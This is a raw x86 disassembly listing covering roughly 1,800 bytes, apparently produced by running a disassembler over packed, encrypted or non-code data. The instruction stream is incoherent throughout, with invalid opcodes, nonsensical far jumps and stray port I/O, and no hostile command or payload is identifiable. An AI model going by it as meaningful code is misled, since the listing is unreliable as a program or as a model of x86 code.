  41a5ad:	pop    ebx
  41a5ae:	shr    DWORD PTR [eax],0xc7
  41a5b1:	jg     0x41a5b6
  41a5b3:	jp     0x41a5cc
  41a5b5:	mov    edi,DWORD PTR [edx]
  41a5b7:	data16 into 
  41a5b9:	pop    ebx
  41a5ba:	mov    ah,0xa9
  41a5bc:	daa    
  41a5bd:	sbb    dl,ch
  41a5bf:	stos   DWORD PTR es:[edi],eax
  41a5c0:	sub    edx,ecx
  41a5c2:	or     BYTE PTR [ecx+0x4b],bh
  41a5c5:	imul   ecx,DWORD PTR [ebp-0x5cb3a7f1],0xbd0cd5ea
  41a5cf:	xor    BYTE PTR [edi-0x66],al
  41a5d2:	into   
  41a5d3:	sub    eax,0xea28c52f
  41a5d8:	mov    esi,0xcc1fd83b
  41a5dd:	dec    ecx
  41a5de:	shl    DWORD PTR [ebp+0x67dc33a7],1
  41a5e4:	retf   
  41a5e5:	shr    DWORD PTR [eax],1
  41a5e7:	das    
  41a5e8:	jmp    0x41a618
  41a5ea:	mov    bl,BYTE PTR [ecx+edi*2-0x2b6390c4]
  41a5f1:	mov    al,0x2d
  41a5f3:	retf   0x98d
  41a5f6:	jecxz  0x41a62f
  41a5f8:	push   ecx
  41a5f9:	mov    dh,0xd1
  41a5fb:	jb     0x41a611
  41a5fd:	mov    eax,0x1f1373ee
  41a602:	adc    eax,0x5c9e9694
  41a607:	out    dx,eax
  41a608:	push   edx
  41a609:	push   0x1472806a
  41a60e:	jecxz  0x41a5b4
  41a610:	retf   0xa0c2
  41a613:	push   edx
  41a614:	fs ss inc esi
  41a617:	in     al,0x4c
  41a619:	loope  0x41a5fc
  41a61b:	push   DWORD PTR [edi+0x3]
  41a61e:	(bad)  
  41a61f:	sbb    al,0x5c
  41a621:	mov    edi,esi
  41a623:	ret    
  41a624:	and    bh,BYTE PTR [ecx]
  41a626:	jo     0x41a5e7
  41a628:	mov    eax,ds:0x54b5939
  41a62d:	aas    
  41a62e:	pop    ecx
  41a62f:	dec    ecx
  41a630:	(bad)  
  41a631:	rol    BYTE PTR ds:0x69c651b4,0x8f
  41a638:	fs and dl,bl
  41a63b:	jp     0x41a650
  41a63d:	leave  
  41a63e:	sahf   
  41a63f:	retf   
  41a640:	rol    BYTE PTR [edi+0x6c78cd95],1
  41a646:	inc    esi
  41a647:	dec    edx
  41a648:	xor    BYTE PTR [edx-0x77],cl
  41a64b:	mov    ds:0x75766e5f,eax
  41a650:	scas   al,BYTE PTR es:[edi]
  41a651:	aas    
  41a652:	(bad)  
  41a653:	lods   al,BYTE PTR ds:[esi]
  41a654:	xlat   BYTE PTR ds:[ebx]
  41a655:	and    DWORD PTR [edi+0x34d0a858],esi
  41a65b:	js     0x41a63d
  41a65d:	inc    ebx
  41a65e:	sub    ebx,DWORD PTR [ecx-0x4556a87]
  41a664:	fidivr DWORD PTR [esi]
  41a666:	jb     0x41a680
  41a668:	shr    BYTE PTR [edx+0x6e],0x77
  41a66c:	xor    bl,BYTE PTR [edx+0x4aa63b4]
  41a672:	mov    WORD PTR [edx+0x53006f84],cs
  41a678:	jge    0x41a635
  41a67a:	jo     0x41a6fb
  41a67c:	in     eax,dx
  41a67d:	pusha  
  41a67e:	pop    ebx
  41a67f:	mov    ecx,DWORD PTR [esi+0x4f]
  41a682:	pop    esp
  41a683:	pop    edi
  41a684:	stos   DWORD PTR es:[edi],eax
  41a685:	jno    0x41a63c
  41a687:	jbe    0x41a66e
  41a689:	ins    DWORD PTR es:[edi],dx
  41a68a:	dec    al
  41a68c:	xchg   esi,eax
  41a68d:	cld    
  41a68e:	out    0x68,eax
  41a690:	mov    eax,ds:0x8ded801d
  41a695:	shr    ebx,cl
  41a697:	push   cs
  41a698:	aad    0x1c
  41a69a:	pop    esi
  41a69b:	outs   dx,DWORD PTR ds:[esi]
  41a69c:	scas   eax,DWORD PTR es:[edi]
  41a69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a69e:	fmul   DWORD PTR [ebp-0x2d82e3c8]
  41a6a4:	and    DWORD PTR [edx],esi
  41a6a6:	sbb    DWORD PTR [edx],ebx
  41a6a8:	gs aaa 
  41a6aa:	sub    esp,edi
  41a6ac:	jo     0x41a6e1
  41a6ae:	repnz push ebx
  41a6b0:	push   ss
  41a6b1:	jnp    0x41a669
  41a6b3:	and    BYTE PTR [esi],ch
  41a6b5:	ds push ecx
  41a6b7:	jns    0x41a679
  41a6b9:	dec    eax
  41a6ba:	inc    edx
  41a6bb:	pop    esi
  41a6bc:	pop    DWORD PTR [edi]
  41a6be:	mov    ebp,DWORD PTR [esp+esi*1]
  41a6c1:	xor    dl,BYTE PTR [ecx-0x3f]
  41a6c4:	inc    eax
  41a6c5:	inc    ebp
  41a6c6:	lea    eax,[edi]
  41a6c8:	lahf   
  41a6c9:	div    DWORD PTR [esi+eax*4]
  41a6cc:	adc    edx,DWORD PTR [esi]
  41a6ce:	in     eax,0x31
  41a6d0:	push   ds
  41a6d1:	adc    esp,eax
  41a6d3:	cmp    al,0x65
  41a6d5:	lock adc al,0xfb
  41a6d8:	jmp    0xd7ba0691
  41a6dd:	mov    al,0x3e
  41a6df:	les    ecx,FWORD PTR [ecx-0x4e]
  41a6e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6e3:	in     al,dx
  41a6e4:	jns    0x41a735
  41a6e6:	(bad)  
  41a6e7:	mov    WORD PTR [ebp+0x79c2fd99],ds
  41a6ed:	test   al,0x74
  41a6ef:	mov    esi,0x2d9e9482
  41a6f4:	cdq    
  41a6f5:	or     ch,BYTE PTR [ebx+0x537c37d3]
  41a6fb:	fs jmp 0xe4cd9e1b
  41a701:	ret    
  41a702:	and    DWORD PTR [ebx-0x73],edi
  41a705:	or     DWORD PTR [esi-0x2c],0x49
  41a709:	jecxz  0x41a692
  41a70b:	xchg   BYTE PTR [edx],dh
  41a70d:	cmp    esi,DWORD PTR [esi+0x134a7763]
  41a713:	dec    ecx
  41a714:	mov    ds:0x2c5637ba,eax
  41a719:	sub    eax,0xb74736e7
  41a71e:	mov    WORD PTR ds:[edi-0x54e19708],gs
  41a725:	call   0xb19c:0x25e89c30
  41a72c:	daa    
  41a72d:	add    BYTE PTR ds:0x2837021a,dl
  41a733:	mov    BYTE PTR [edi],cl
  41a735:	aad    0x2f
  41a737:	addr16 into 
  41a739:	out    dx,al
  41a73a:	cmp    BYTE PTR [eax-0x74],al
  41a73d:	dec    edi
  41a73e:	sti    
  41a73f:	popf   
  41a740:	lea    edi,[esp-0x586bc94c]
  41a747:	push   edx
  41a748:	hlt    
  41a749:	leave  
  41a74a:	outs   dx,DWORD PTR ds:[esi]
  41a74b:	cmp    cl,dh
  41a74d:	int3   
  41a74e:	aam    0x5a
  41a750:	push   ss
  41a751:	xchg   DWORD PTR [esi+0x72676014],ecx
  41a757:	xor    DWORD PTR [eax+eiz*2],eax
  41a75a:	sbb    cl,BYTE PTR [bx+di+0x60]
  41a75e:	sbb    al,0x25
  41a760:	jle    0x41a762
  41a762:	jle    0x41a6e6
  41a764:	inc    eax
  41a765:	jp     0x41a7a1
  41a767:	jmp    0x41a6f7
  41a769:	daa    
  41a76a:	inc    edx
  41a76b:	xor    DWORD PTR [esi-0x12d88ad5],edx
  41a771:	inc    ecx
  41a772:	in     al,0x4a
  41a774:	lock or dl,BYTE PTR [eax-0x7f424f85]
  41a77b:	out    dx,eax
  41a77c:	xchg   ecx,eax
  41a77d:	jmp    0x9486:0x6dfc693f
  41a784:	mov    edx,esp
  41a786:	adc    cl,cl
  41a788:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41a78a:	push   ebx
  41a78b:	xor    BYTE PTR [ecx+0x1f],bh
  41a78e:	xchg   ebx,eax
  41a78f:	push   edi
  41a790:	xchg   bl,cl
  41a792:	sar    cl,1
  41a794:	adc    ecx,esi
  41a796:	push   cs
  41a797:	cli    
  41a798:	repz sahf 
  41a79a:	popa   
  41a79b:	push   ss
  41a79c:	popf   
  41a79d:	or     ah,BYTE PTR [edx-0x39]
  41a7a0:	(bad)  [edx-0x79]
  41a7a3:	sbb    cl,al
  41a7a5:	add    DWORD PTR [ecx+0x4f],0xffffff8c
  41a7a9:	loopne 0x41a7f6
  41a7ab:	cs ret 0x7276
  41a7af:	lods   al,BYTE PTR ds:[esi]
  41a7b0:	bound  ecx,QWORD PTR [ebx-0x2c]
  41a7b3:	add    al,0x39
  41a7b5:	shr    esi,cl
  41a7b7:	(bad)  
  41a7b8:	out    0x57,eax
  41a7ba:	adc    al,0x8f
  41a7bc:	add    al,0x7
  41a7be:	mov    esp,0x323aee5
  41a7c3:	mov    dl,0xd1
  41a7c5:	jbe    0x41a7ab
  41a7c7:	lock push edi
  41a7c9:	add    edx,DWORD PTR [eax-0x80]
  41a7cc:	xchg   ebp,eax
  41a7cd:	iret   
  41a7ce:	std    
  41a7cf:	ins    BYTE PTR es:[edi],dx
  41a7d0:	sub    eax,0x4cdbf2f9
  41a7d5:	add    BYTE PTR [edx-0x39],ch
  41a7d8:	and    BYTE PTR [edi+ebp*4+0x3c],0x14
  41a7dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7de:	jmp    0x41a784
  41a7e0:	in     al,0x56
  41a7e2:	cmp    ah,cl
  41a7e4:	pushf  
  41a7e5:	leave  
  41a7e6:	call   0x1ad6:0x39765ade
  41a7ed:	dec    esp
  41a7ee:	adc    DWORD PTR [ecx+0x2c6f335d],esi
  41a7f4:	pop    esi
  41a7f5:	aaa    
  41a7f6:	mov    cl,0x8e
  41a7f8:	mov    esp,0x2937cf9f
  41a7fd:	cld    
  41a7fe:	jmp    0x87e42254
  41a803:	xchg   DWORD PTR [edx+0x2a0ba838],edx
  41a809:	jl     0x41a801
  41a80b:	pushf  
  41a80c:	into   
  41a80d:	ins    BYTE PTR es:[edi],dx
  41a80e:	lock ror BYTE PTR [eax-0x65e1af33],cl
  41a815:	and    edi,ebp
  41a817:	lods   al,BYTE PTR ds:[esi]
  41a818:	mov    bh,0xa3
  41a81a:	fisub  DWORD PTR ds:0x9d36bd37
  41a820:	repz sbb ch,BYTE PTR [ecx+ecx*1+0x6]
  41a825:	arpl   WORD PTR [ebx+eax*1-0x509215d9],cx
  41a82c:	fcom   DWORD PTR [ebx-0x1a]
  41a82f:	test   BYTE PTR [ebp-0x43],al
  41a832:	add    BYTE PTR [edx+0xaa3f94e],cl
  41a838:	ret    
  41a839:	sbb    BYTE PTR [esp+edx*1+0x3e],bh
  41a83d:	and    bh,BYTE PTR [edi+0x57]
  41a840:	retf   
  41a841:	pop    esp
  41a842:	rol    DWORD PTR [esi],0xfd
  41a845:	mov    dl,0x53
  41a847:	ffree  st(6)
  41a849:	shl    ecx,cl
  41a84b:	lock push cs
  41a84d:	les    esp,FWORD PTR [ebx]
  41a84f:	or     eax,0xe59e9cf2
  41a854:	(bad)  
  41a855:	(bad)  
  41a856:	mov    edx,0xc271d781
  41a85b:	mov    dh,BYTE PTR [esp+ebx*1-0x27]
  41a85f:	sub    BYTE PTR [edx],dl
  41a861:	nop
  41a862:	mov    esi,DWORD PTR [edx+0x224bc583]
  41a868:	and    dl,BYTE PTR [edx-0x47]
  41a86b:	xor    bl,BYTE PTR [ebx-0x5c]
  41a86e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a86f:	or     cl,BYTE PTR [esp+edx*8+0x71a643ba]
  41a876:	push   es
  41a877:	call   0xf951:0xa8501b13
  41a87e:	jnp    0x41a8e8
  41a880:	sub    DWORD PTR [esi],0xffffff98
  41a883:	mov    ah,BYTE PTR [esi-0xb0f4695]
  41a889:	pop    esi
  41a88a:	adc    DWORD PTR [eax+0x55e014ec],edx
  41a890:	int3   
  41a891:	sar    DWORD PTR [ecx],cl
  41a893:	push   eax
  41a894:	sub    al,0xd
  41a896:	jne    0x41a862
  41a898:	retf   0x5113
  41a89b:	mov    dl,0x1a
  41a89d:	cmp    DWORD PTR [esi],edx
  41a89f:	and    al,0xff
  41a8a1:	mov    eax,0x3384e767
  41a8a6:	push   edi
  41a8a7:	push   0xffffffef
  41a8a9:	stc    
  41a8aa:	data16 in al,dx
  41a8ac:	test   DWORD PTR [edi+0x1f092602],esp
  41a8b2:	or     ah,BYTE PTR [edi]
  41a8b4:	jecxz  0x41a8c9
  41a8b6:	and    esi,0x1680781d
  41a8bc:	bound  eax,QWORD PTR [edi-0x1b56aec9]
  41a8c2:	xor    DWORD PTR [esi+0x65],0x78
  41a8c6:	sbb    bl,BYTE PTR [edx]
  41a8c8:	adc    eax,0x6186365
  41a8cd:	push   ecx
  41a8ce:	fsubr  QWORD PTR [edx-0xf]
  41a8d1:	std    
  41a8d2:	add    al,0x35
  41a8d4:	sub    eax,0xc02c03fc
  41a8d9:	stc    
  41a8da:	and    bl,BYTE PTR [ebx]
  41a8dc:	mov    ah,0x69
  41a8de:	mov    al,0x58
  41a8e0:	adc    al,0x5e
  41a8e2:	xor    BYTE PTR [edx+0x0],ah
  41a8e5:	mov    bh,0x87
  41a8e7:	out    0x72,eax
  41a8e9:	outs   dx,BYTE PTR ds:[esi]
  41a8ea:	jmp    0x8709d9f4
  41a8ef:	or     eax,0x45f2bf86
  41a8f4:	xor    al,0x67
  41a8f6:	bound  esp,QWORD PTR [ebx-0x104fe59e]
  41a8fc:	or     eax,0x932e319f
  41a901:	xchg   ebx,eax
  41a902:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a903:	cmp    al,0x20
  41a905:	push   es
  41a906:	loop   0x41a8ce
  41a908:	mov    edi,0xc1d6a9d5
  41a90d:	aaa    
  41a90e:	xor    ah,BYTE PTR [edi+0x463ae97]
  41a914:	aam    0xd6
  41a916:	mov    eax,0xeb942361
  41a91b:	pop    es
  41a91c:	shl    DWORD PTR [ecx],cl
  41a91e:	mov    bh,0xf1
  41a920:	sub    al,dl
  41a922:	sub    ah,0x4c
  41a925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a926:	ror    BYTE PTR [esi+0x3b37285c],1
  41a92c:	icebp  
  41a92d:	(bad)  
  41a92f:	(bad)  
  41a930:	mov    esp,0x9d5371be
  41a935:	and    ebp,DWORD PTR [edx+0x6740ed45]
  41a93b:	and    eax,0xc9dcd8bd
  41a940:	xor    DWORD PTR ss:[edi-0x66d8b7ce],esi
  41a947:	in     al,0x9e
  41a949:	fisubr WORD PTR [eax]
  41a94b:	sbb    bh,bl
  41a94d:	pop    esp
  41a94e:	scas   al,BYTE PTR es:[edi]
  41a94f:	cmp    BYTE PTR [edx+esi*2-0x743c8a35],al
  41a956:	(bad)  
  41a957:	je     0x41a99f
  41a959:	mov    eax,ds:0x77276e5d
  41a95e:	cmp    cl,0x23
  41a961:	jecxz  0x41a974
  41a963:	lods   eax,DWORD PTR ds:[esi]
  41a964:	bound  eax,QWORD PTR [eax+0x2802b6ad]
  41a96a:	and    ebp,esi
  41a96c:	mov    al,ds:0x3f53d516
  41a971:	cli    
  41a972:	int3   
  41a973:	inc    ebx
  41a974:	ds pop edi
  41a976:	mov    ah,0x33
  41a978:	clc    
  41a979:	jae    0x41a92f
  41a97b:	mov    dh,0xae
  41a97d:	arpl   WORD PTR [ecx-0x74],bx
  41a980:	(bad)  
  41a982:	cs call esi
  41a985:	(bad)  
  41a986:	cli    
  41a987:	jae    0x41a990
  41a989:	sbb    BYTE PTR [ebp-0x5904c170],dl
  41a98f:	lods   eax,DWORD PTR ds:[esi]
  41a990:	leave  
  41a991:	xor    al,BYTE PTR [ebp-0x645b2c3c]
  41a997:	pop    ds
  41a998:	adc    DWORD PTR [ecx+0x19],esp
  41a99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a99c:	out    0x61,al
  41a99e:	mov    bl,0x53
  41a9a0:	fnstsw WORD PTR [ecx+0x59]
  41a9a3:	push   edi
  41a9a4:	std    
  41a9a5:	pusha  
  41a9a6:	push   ebp
  41a9a7:	push   ebp
  41a9a8:	sub    ebx,eax
  41a9aa:	add    al,0xbc
  41a9ac:	outs   dx,DWORD PTR ds:[esi]
  41a9ad:	mov    al,0x6d
  41a9af:	in     al,0xd7
  41a9b1:	rcr    DWORD PTR [esi],cl
  41a9b3:	push   ecx
  41a9b4:	rep lods al,BYTE PTR ds:[esi]
  41a9b6:	pushf  
  41a9b7:	push   0xffffffae
  41a9b9:	mov    edx,0xd4b149c8
  41a9be:	jae    0x41a960
  41a9c0:	jb     0x41a9b1
  41a9c2:	imul   ecx,DWORD PTR [esp+ebx*8-0x1dad24a9],0x6a
  41a9ca:	mov    DWORD PTR [ebx+ebp*8+0x3fade46a],edx
  41a9d1:	or     ch,BYTE PTR [ebx-0x78db91e9]
  41a9d7:	cmovnp ecx,DWORD PTR [ecx-0x60]
  41a9db:	sub    al,0xdd
  41a9dd:	shr    DWORD PTR [edi+ebp*1],1
  41a9e0:	or     eax,0xf6c0c2e2
  41a9e5:	je     0x41aa4f
  41a9e7:	ret    
  41a9e8:	jnp    0x41aa3d
  41a9ea:	adc    esp,DWORD PTR [esi+0x57f0c457]
  41a9f0:	jg     0x41a9be
  41a9f2:	pop    es
  41a9f3:	lock inc eax
  41a9f5:	jge    0x41a98a
  41a9f7:	push   ecx
  41a9f8:	lods   eax,DWORD PTR ds:[esi]
  41a9f9:	iret   
  41a9fa:	inc    edi
  41a9fb:	xchg   ebx,eax
  41a9fc:	call   0xd839:0xc465601d
  41aa03:	das    
  41aa04:	or     ah,al
  41aa06:	push   ecx
  41aa07:	add    ch,al
  41aa09:	inc    eax
  41aa0a:	cmp    BYTE PTR [edi+eax*8+0xba26bc7],0x25
  41aa12:	jb     0x41a9b9
  41aa14:	pop    edx
  41aa15:	hlt    
  41aa16:	xchg   edx,eax
  41aa17:	mov    ch,0x16
  41aa19:	xor    dh,bh
  41aa1b:	pop    ds
  41aa1c:	fisttp QWORD PTR [edx-0x7b22461a]
  41aa22:	sub    ecx,DWORD PTR [ebp+0x22]
  41aa25:	sub    dh,BYTE PTR [ebx+eax*4]
  41aa28:	dec    esi
  41aa29:	xchg   DWORD PTR [esi+0xc],ecx
  41aa2c:	or     sp,ax
  41aa2f:	cmp    bh,BYTE PTR [ecx]
  41aa31:	or     al,0x6c
  41aa33:	lahf   
  41aa34:	ins    DWORD PTR es:[edi],dx
  41aa35:	jg     0x41aa46
  41aa37:	out    dx,al
  41aa38:	mov    al,0x28
  41aa3a:	xchg   BYTE PTR ds:0x2ede5ce5,cl
  41aa40:	jp     0x41aa34
  41aa42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa43:	ins    BYTE PTR es:[edi],dx
  41aa44:	lahf   
  41aa45:	mov    bh,0x17
  41aa47:	idiv   BYTE PTR ds:0xb546fcf6
  41aa4d:	push   0x38
  41aa4f:	push   cs
  41aa50:	dec    ecx
  41aa51:	cmp    eax,0xba7cc203
  41aa56:	jmp    0x41aacb
  41aa58:	sub    esp,DWORD PTR [esi+0x7c2f036c]
  41aa5e:	or     DWORD PTR [eax+0x6a],edi
  41aa61:	mov    al,ds:0x2004dbf8
  41aa66:	popf   
  41aa67:	shl    edx,1
  41aa69:	pop    ds
  41aa6a:	retf   0x261e
  41aa6d:	pop    esi
  41aa6e:	or     al,0x2d
  41aa70:	ss mov cl,0x8
  41aa73:	std    
  41aa74:	and    DWORD PTR [ecx],ebp
  41aa76:	sub    al,BYTE PTR [eax+0x65]
  41aa79:	shl    BYTE PTR [edi+edx*8-0x4107dde1],cl
  41aa80:	popf   
  41aa81:	push   esi
  41aa82:	aad    0x87
  41aa84:	fucomi st,st(6)
  41aa86:	fimul  DWORD PTR [esi+0x2c]
  41aa89:	lock inc edx
  41aa8b:	shl    DWORD PTR [edx+0x46dc8bd3],0xc9
  41aa92:	cdq    
  41aa93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa94:	(bad)  
  41aa95:	out    0x90,al
  41aa97:	jbe    0x41ab01
  41aa99:	mov    ah,0x5
  41aa9b:	jns    0x41ab02
  41aa9d:	adc    al,0x2
  41aa9f:	jns    0x41aaac
  41aaa1:	and    BYTE PTR [esi],al
  41aaa3:	retf   
  41aaa4:	sar    DWORD PTR [esi-0x1f],0x9e
  41aaa8:	mov    dl,BYTE PTR [esi+0x79]
  41aaab:	loop   0x41aab5
  41aaad:	xor    eax,esp
  41aaaf:	js     0x41aaa5
  41aab1:	jbe    0x41aa94
  41aab3:	or     bh,BYTE PTR [ecx+0x51a949c6]
  41aab9:	mov    WORD PTR [ebx],es
  41aabb:	shl    BYTE PTR [edi-0x13238795],cl
  41aac1:	or     ah,BYTE PTR [edx+0x5305924]
  41aac7:	add    al,0xe8
  41aac9:	out    0xb1,al
  41aacb:	int3   
  41aacc:	inc    esp
  41aacd:	je     0x41aaa1
  41aacf:	pop    ss
  41aad0:	sub    cl,BYTE PTR [edx]
  41aad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad3:	dec    ebx
  41aad4:	adc    eax,DWORD PTR [eax]
  41aad6:	call   0x3840:0xedf8b2c
  41aadd:	push   ecx
  41aade:	lahf   
  41aadf:	shl    edi,1
  41aae1:	cmp    bl,BYTE PTR [esi-0x2f]
  41aae4:	sub    dl,BYTE PTR [eax-0x62]
  41aae7:	ret    0x5354
  41aaea:	sub    eax,0x401de150
  41aaef:	jo     0x41ab2c
  41aaf1:	sbb    DWORD PTR [eax+0x56],eax
  41aaf4:	sub    bl,cl
  41aaf6:	ds pop es
  41aaf8:	ins    BYTE PTR es:[edi],dx
  41aaf9:	mov    ah,0xa3
  41aafb:	jno    0x41aa99
  41aafd:	out    dx,al
  41aafe:	mov    al,0xf
  41ab00:	cli    
  41ab01:	mov    eax,ds:0x5f41d94f
  41ab06:	pop    ds
  41ab07:	push   ecx
  41ab08:	rcl    ecx,cl
  41ab0a:	push   0xffffffb1
  41ab0c:	sub    BYTE PTR [esi-0x3f0a96fe],dl
  41ab12:	mov    edi,0xec210252
  41ab17:	or     al,0xb9
  41ab19:	add    al,BYTE PTR [ecx]
  41ab1b:	cdq    
  41ab1c:	adc    ah,dl
  41ab1e:	ret    0x90ca
  41ab21:	or     eax,DWORD PTR [edx-0x33]
  41ab24:	jae    0x41ab87
  41ab26:	div    BYTE PTR [ebx+0x65279d0e]
  41ab2c:	mov    dl,0xc2
  41ab2e:	into   
  41ab2f:	sbb    bh,bh
  41ab31:	pusha  
  41ab32:	lods   eax,DWORD PTR ds:[esi]
  41ab33:	sahf   
  41ab34:	gs je  0x41ab89
  41ab37:	repnz in eax,dx
  41ab39:	mov    ds:0xf9bd8ac7,al
  41ab3e:	pop    eax
  41ab3f:	test   BYTE PTR [edi],bl
  41ab41:	in     al,dx
  41ab42:	adc    BYTE PTR [ebp+0x11],0x93
  41ab46:	sub    DWORD PTR [ebp+0x3988e9c9],ebp
  41ab4c:	loop   0x41ab06
  41ab4e:	mov    ds:0x31b3ded4,eax
  41ab53:	popa   
  41ab54:	sbb    eax,0xbc3b4a73
  41ab59:	push   ebp
  41ab5a:	mov    dh,0x67
  41ab5c:	push   ebx
  41ab5d:	cmp    al,0x31
  41ab5f:	dec    ebp
  41ab60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab61:	cmp    DWORD PTR cs:[ebp+0x71a42cb1],0xe6dc687d
  41ab6c:	test   eax,0x2af88597
  41ab71:	xchg   ebp,eax
  41ab72:	lea    esp,[ebp+0x39713996]
  41ab78:	test   eax,0xfb4d2475
  41ab7d:	xchg   ebx,eax
  41ab7e:	push   esi
  41ab7f:	adc    DWORD PTR [esi+0x5b],eax
  41ab82:	inc    eax
  41ab83:	cs (bad) 
  41ab85:	out    dx,al
  41ab86:	lods   al,BYTE PTR ds:[esi]
  41ab87:	cmp    bl,dl
  41ab89:	jl     0x41ab53
  41ab8b:	call   0xeaa5:0x757c02bf
  41ab92:	add    eax,0x35aac724
  41ab97:	fist   DWORD PTR [ecx]
  41ab99:	icebp  
  41ab9a:	pop    ebp
  41ab9b:	xchg   esp,eax
  41ab9c:	push   0xded86e45
  41aba1:	mov    WORD PTR [ebp+0x256bcd10],ss
  41aba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aba8:	mov    esi,0x97be7c1a
  41abad:	mov    ebx,0x605eeac3
  41abb2:	(bad)  
  41abb3:	pushf  
  41abb4:	sar    DWORD PTR [edx-0x78e3979a],0x2a
  41abbb:	pop    esi
  41abbc:	aam    0x79
  41abbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abbf:	sub    eax,0xa468c172
  41abc4:	push   ecx
  41abc5:	jp     0x41abe9
  41abc7:	jmp    0x5103ba25
  41abcc:	sahf   
  41abcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abce:	mov    WORD PTR [eiz*1-0x32baa425],?
  41abd5:	jcxz   0x41abf6
  41abd8:	iret   
  41abd9:	or     ch,BYTE PTR [ecx]
  41abdb:	dec    esi
  41abdc:	imul   esi,DWORD PTR [esi+0x6e068cb1],0x17
  41abe3:	dec    ebx
  41abe4:	mov    ecx,0x6db41956
  41abe9:	les    ecx,FWORD PTR [eax-0x1500d4e9]
  41abef:	mov    al,0x16
  41abf1:	mov    BYTE PTR [eax-0x3e7c667b],0x72
  41abf8:	add    BYTE PTR [eax-0x24],dh
  41abfb:	cdq    
  41abfc:	repz clc 
  41abfe:	push   ebp
  41abff:	sbb    eax,0x4f36c110
  41ac04:	(bad)  
  41ac05:	shl    DWORD PTR [esi],0xe5
  41ac08:	or     DWORD PTR [ecx+0x1],edx
  41ac0b:	in     al,0xb5
  41ac0d:	push   ebx
  41ac0e:	retf   0x5ffa
  41ac11:	retf   0x7d13
  41ac14:	mov    ah,0x8d
  41ac16:	aas    
  41ac17:	bound  edx,QWORD PTR [ebp+0x15b06fd0]
  41ac1d:	dec    esp
  41ac1e:	imul   edi,DWORD PTR [edi+0x3c150dd7],0x40
  41ac25:	ficom  DWORD PTR [ebp-0x6fff3847]
  41ac2b:	repz scas al,BYTE PTR es:[edi]
  41ac2d:	mov    eax,0x523a6e8b
  41ac32:	add    eax,0xce77095a
  41ac37:	jp     0x41abe6
  41ac39:	scas   eax,DWORD PTR es:[edi]
  41ac3a:	repz dec esp
  41ac3c:	es stos DWORD PTR es:[edi],eax
  41ac3e:	retf   
  41ac3f:	lods   al,BYTE PTR ds:[esi]
  41ac40:	and    eax,0xedbde1b1
  41ac45:	jne    0x41ac48
  41ac47:	cdq    
  41ac48:	jo     0x41ac59
  41ac4a:	aam    0x96
  41ac4c:	inc    ebp
  41ac4d:	sbb    eax,0xc9188b57
  41ac52:	sub    DWORD PTR [ebx-0x4d3f3209],edi
  41ac58:	lahf   
  41ac59:	inc    ebx
  41ac5a:	xchg   ebx,eax
  41ac5b:	nop
  41ac5c:	call   0xa4604352
  41ac61:	arpl   WORD PTR [edi-0x5b8646a9],ax
  41ac67:	test   BYTE PTR [edi+0x68],bh
  41ac6a:	push   edi
  41ac6b:	dec    edx
  41ac6c:	outs   dx,BYTE PTR ds:[esi]
  41ac6d:	int3   
  41ac6e:	neg    BYTE PTR [ecx+0x1e]
  41ac71:	popa   
  41ac72:	mov    ch,0xf
  41ac74:	push   0xffffffc6
  41ac76:	push   ds
  41ac77:	retf   0xf3c5
  41ac7a:	sar    cl,0xfa
  41ac7d:	pop    esp
  41ac7e:	ins    DWORD PTR es:[edi],dx
  41ac7f:	ficom  WORD PTR [ebx]
  41ac81:	mov    esi,0x83a3c5a
  41ac86:	xchg   ebx,eax
  41ac87:	std    
  41ac88:	and    dh,BYTE PTR [eax+0x35]
  41ac8b:	cmp    dl,BYTE PTR [esi]
  41ac8d:	mov    ss,eax
  41ac8f:	packsswb mm0,QWORD PTR [ebx]
  41ac92:	xor    ah,dh
  41ac94:	fcmovu st,st(1)
  41ac96:	in     al,dx
  41ac97:	fstp   TBYTE PTR [ecx]
  41ac99:	inc    BYTE PTR ds:0xd8fac7d0
  41ac9f:	das    
  41aca0:	push   ss
  41aca1:	xor    ecx,DWORD PTR [esp+0x5ae8b73a]
  41aca8:	enter  0xf5e,0x65
  41acac:	xor    dh,dh
  41acae:	push   ebx
  41acaf:	loop   0x41acad
  41acb1:	ins    BYTE PTR es:[edi],dx
  41acb2:	xchg   ebp,eax
  41acb3:	and    ecx,DWORD PTR [ebx-0x6727ff6b]
  41acb9:	neg    BYTE PTR [eax-0x4d]
  41acbc:	cmp    DWORD PTR [edx-0x15],esi
  41acbf:	test   al,0x98
  41acc1:	cmp    dh,dl
  41acc3:	sahf   
  41acc4:	inc    esi
  41acc5:	jle    0x41ad07
  41acc7:	gs (bad) 
  41acc9:	rcl    BYTE PTR [esp+eiz*2-0x4d5f314a],1
  41acd0:	(bad)  
  41acd1:	stos   DWORD PTR es:[edi],eax
  41acd2:	push   ecx
  41acd3:	es mov esi,0x847012b7
  41acd9:	add    eax,0x8912d313
  41acde:	push   edx
  41acdf:	addr16 ret 0x434e
  41ace3:	retf   0x8aae
  41ace6:	mov    ds:0x406d6fcf,eax
  41aceb:	or     al,0xa8
  41aced:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acee:	add    bh,BYTE PTR [edx]
  41acf0:	test   DWORD PTR [eax],ecx
  41acf2:	lods   al,BYTE PTR ds:[esi]
  41acf3:	in     al,dx
  41acf4:	fstp   DWORD PTR [edx]
  41acf6:	call   0xa0df:0x3cc686e1
  41acfd:	jb     0x41ad0e
  41acff:	icebp  
  41ad00:	fnstcw WORD PTR [edx+0x4f136885]
  41ad06:	lods   eax,DWORD PTR ds:[esi]
  41ad07:	jae    0x41ace8
  41ad09:	bound  bp,DWORD PTR [ebp+0x33eaee88]
  41ad10:	adc    ebp,ebp
